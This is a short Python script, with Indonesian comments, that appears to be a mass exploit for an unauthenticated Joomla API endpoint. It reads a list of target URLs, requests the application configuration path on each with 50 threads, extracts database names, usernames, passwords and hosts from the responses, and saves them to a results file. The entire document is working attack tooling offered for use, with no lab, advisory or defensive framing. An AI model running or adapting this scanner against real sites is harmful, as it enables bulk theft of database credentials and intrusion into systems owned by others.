import re
import requests
from multiprocessing.dummy import Pool as ThreadPool

TIMEOUT = 5

filename = input("Enter file name: ") # prompt user for the file name
with open(filename, "r") as file:
    urls = file.read().splitlines()

def process_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    url += "/api/index.php/v1/config/application?public=true" # menambahkan path diakhir setiap URL
    try:
        response = requests.get(url, timeout=TIMEOUT)
        data = response.text

        db = re.search(r'"db":"([^"]+)"', data)
        user = re.search(r'"user":"([^"]+)"', data)
        password = re.search(r'"password":"([^"]+)"', data)
        host = re.search(r'"host":"([^"]+)"', data)

        if db and user and password and host:
            output = f"{url}|{db.group(1)}|{user.group(1)}|{password.group(1)}|{host.group(1)}"

            print(f"Found: {output}")

            with open("results.txt", "a") as file:
                file.write(output + "\n")
        else:
            print(f"Not Found: {url}")
    except Exception as e:
        print(f"Error: {url} ")

with ThreadPool(50) as pool:
    pool.map(process_url, urls)

with open("results.txt", "r") as file:
    urls_data = file.read().splitlines()

def process_data(data):
    data_list = data.split("|")
    if len(data_list) == 5:
        url, db, user, password, host = data_list
        # memformat output sesuai dengan yang diminta
        output = f"{url}|{db}|{user}|{password}|{host}"
        return output
    else:
        print(f"Invalid data format: {data}")
        return ""

with ThreadPool(300) as pool:
    results = pool.map(process_data, urls_data)

with open("results.txt", "w") as file:
    file.write("\n".join([result for result in results if result != ""]))

print("done Check Your Results.txt") # menampilkan pesan jika proses sudah selesai
